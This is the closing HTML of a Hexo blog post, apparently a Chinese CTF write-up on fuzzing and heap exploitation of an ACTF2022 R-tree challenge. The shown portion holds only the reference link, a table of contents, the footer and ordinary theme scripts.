+<p>参考链接: <a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-273516-1.htm#msg_header_h1_2">【ACTF2022】从Fuzz到XCTF赛题</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/pwn/" rel="tag">pwn</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/%E5%AE%89%E5%85%A8/" rel="tag">安全</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/covers/er.jpg" data-sizes="auto" alt="CNVD-2018-01084" class="lazyload">
+        
+      
+      <a href="/2025/06/16/CNVD-2018-01084%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CNVD-2018-01084
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2020-2025
+      
+      <span class="footer-info-sep rotate"></span>
+      zer00ne
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        27.7k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        02:00
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#fuzzing-fuzzing-%E1%97%9C%E1%B4%97%E1%97%9C"><span class="toc-number">1.</span> <span class="toc-text">fuzzing?fuzzing!(ᗜᴗᗜ)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0-%E5%89%8D%E8%A8%80"><span class="toc-number">1.1.</span> <span class="toc-text">| 0 | 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E5%8E%9F%E7%90%86"><span class="toc-number">1.2.</span> <span class="toc-text">| 1 | 原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-ACTF%E2%80%93%E8%AE%A9%E6%88%91%E4%BB%AC%E8%A7%A3%E5%BC%80R%E6%A0%91%E7%9A%84%E7%A7%98%E5%AF%86"><span class="toc-number">1.3.</span> <span class="toc-text">| 2 | ACTF–让我们解开R树的秘密</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#2-1-%E5%87%A0%E4%B9%8E%E6%B2%A1%E6%9C%89%E6%84%8F%E4%B9%89%E7%9A%84%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="toc-number">1.3.1.</span> <span class="toc-text">2.1 几乎没有意义的逆向分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#R%E6%A0%91%E7%9A%84%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.3.1.1.</span> <span class="toc-text">R树的介绍</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AF%B9%E5%A4%A7%E6%A6%82%E6%93%8D%E4%BD%9C%E7%9A%84%E7%90%86%E8%A7%A3"><span class="toc-number">1.3.1.2.</span> <span class="toc-text">对大概操作的理解</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-2%E5%BC%80%E5%A7%8Bfuzzing"><span class="toc-number">1.3.2.</span> <span class="toc-text">2.2开始fuzzing!</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-3-%E4%BA%BA%E8%84%91%E4%BB%A3%E6%9B%BF%E7%94%B5%E8%84%91%E6%80%9D%E8%80%83-%E5%A0%86%E5%88%A9%E7%94%A8"><span class="toc-number">1.3.3.</span> <span class="toc-text">2.3 人脑代替电脑思考-堆利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#double-free%E7%9A%84%E5%8A%AB%E6%8C%81"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">double free的劫持</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#teache-struct"><span class="toc-number">1.3.3.1.1.</span> <span class="toc-text">teache_struct</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%84%E9%9C%B2libc"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">泄露libc</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E4%B8%80%E6%AD%A5-%E5%8A%AB%E6%8C%81-free-hook"><span class="toc-number">1.3.4.</span> <span class="toc-text">最后一步,劫持__free_hook</span></a></li></ol></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+        <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.webp" data-sizes="auto" alt="zer00ne" class="lazyload">
+  <div class="sidebar-author-name">zer00ne</div>
+  <div class="sidebar-description"></div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">13</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">0</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">6</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+      
+    
+  </div>
+  
+    
+      <div class="sidebar-btn-wrapper">
+        <div class="sidebar-toc-btn current"></div>
+        <div class="sidebar-common-btn"></div>
+      </div>
+    
+  
+</nav>
+
+    </div>
+    
+    
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.1.1/dist/index.umd.js" integrity="sha384-8LyaidD9GPxQQgLJO&#x2F;WRw&#x2F;O2h3BoNq&#x2F;ApI&#x2F;ecpvM6RsrCz2qP2ppBXUKihP4V&#x2F;2d" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["var(--red-1)","var(--red-2)","var(--red-3)","var(--red-4)"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["var(--red-0)"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+  <script>
+    function initLive2d() {
+      live2d.init("https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/", {themeTipsPath: ""});
+    }
+  </script>
+  
+<script src="https://fastly.jsdelivr.net/gh/D-Sketon/plugin-live2d/js/live2d-autoload.js" onload="initLive2d &amp;&amp; initLive2d()" async></script>
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "zer00ne",
+          title: "r树的秘密",
+          url: "https://khighl.github.io.git/2025/06/28/fuzz/",
+          excerpt: "",
+          description: "",
+          stripContent: "fuzzing?fuzzing!(ᗜᴗᗜ)| 0 | 前言如果你也遇到过:IDA反编译出来的数据结构充满了各种交叉引用与奇奇怪怪的数据结构,别说逆向分析了,就算是用gdb调试出来都是越看越晕✋别担心,fuzzing会帮你解决一切😇😇😇 | 1 | 原理通过查询gpt,我们获得以下信息 Fuzzing，中文一般翻译为“模糊测试”，是一种自动化测试技术，主要用于发现程序中的漏洞和异常行为。它的核心思想就像是：  「嘿我往你的程序里灌各种奇怪、乱七八糟的输入，看看你会不会崩溃(*≧▽≦)ﾉｼ）」",
+          date: "Sat Jun 28 2025 00:00:00 GMT+0800",
+          updated: "Sat Jun 28 2025 18:13:56 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+        
+
+
+
+
+
+
+
+
+      
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.8.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+
+
+
+
+
+
+    
+  </body>
+  </html>
+
